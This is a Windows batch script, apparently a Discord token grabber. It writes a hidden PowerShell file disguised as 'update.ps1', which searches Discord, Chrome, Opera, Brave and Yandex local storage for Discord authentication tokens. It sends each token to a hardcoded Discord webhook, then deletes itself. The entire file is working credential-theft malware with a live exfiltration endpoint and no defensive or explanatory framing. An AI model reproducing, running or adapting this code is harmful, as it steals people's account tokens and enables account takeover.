@echo off
if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
set webhook=https://discord.com/api/webhooks/1447250201348800572/DXl-0ziQNpzC0vL5CcWEK6a30SNpfs7t7wBM-XhBMlxWObDc_OaZb3UsPWJp3U9JBz3F
if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
echo $ErrorActionPreference= 'silentlycontinue'>>%appdata%\update.ps1
echo $tokensString = new-object System.Collections.Specialized.StringCollection>>%appdata%\update.ps1
echo $webhook_url = "%webhook%">>%appdata%\update.ps1
echo $location_array = @(>>%appdata%\update.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\discordptb\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo )>>%appdata%\update.ps1
echo foreach ($path in $location_array) {>>%appdata%\update.ps1
echo     if(Test-Path $path){>>%appdata%\update.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>%appdata%\update.ps1
echo             $data = Get-Content -Path "$($path)\$($file)">>%appdata%\update.ps1
echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'>>%appdata%\update.ps1
echo             $match = $regex.Match($data)>>%appdata%\update.ps1
echo             while ($match.Success) {>>%appdata%\update.ps1
echo                 if (!$tokensString.Contains($match.Value)) {>>%appdata%\update.ps1
echo                     $tokensString.Add($match.Value) ^| out-null>>%appdata%\update.ps1
echo                 }>>%appdata%\update.ps1
echo                 $match = $match.NextMatch()>>%appdata%\update.ps1
echo             } >>%appdata%\update.ps1
echo         }>>%appdata%\update.ps1
echo     }>>%appdata%\update.ps1
echo }>>%appdata%\update.ps1
echo foreach ($token in $tokensString) {>>%appdata%\update.ps1
echo     $message = ^"** Discord token : **>>%appdata%\update.ps1
echo     ``` $token ``` ^">>%appdata%\update.ps1
echo     $hash = @{ "content" = $message; }>>%appdata%\update.ps1
echo     $JSON = $hash ^| convertto-json>>%appdata%\update.ps1
echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\update.ps1
echo }>>%appdata%\update.ps1
powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1
del %appdata%\Update.ps1